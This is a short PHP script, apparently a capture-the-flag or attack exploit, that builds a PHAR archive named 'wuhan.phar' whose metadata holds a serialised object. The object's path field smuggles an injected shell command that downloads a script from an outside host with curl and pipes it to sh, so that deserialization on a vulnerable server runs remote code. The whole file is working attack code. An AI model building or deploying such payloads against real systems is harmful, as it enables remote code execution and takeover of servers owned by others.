<?php

class InitialOperation {
    private $path = "/tmp/* ; curl https://bravo.nctu.me/rs|sh";
}


@unlink("wuhan.phar");
$phar = new Phar("wuhan.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new InitialOperation());
$phar->addFromString("coronavirus.txt", "coronavirus");
$phar->stopBuffering();
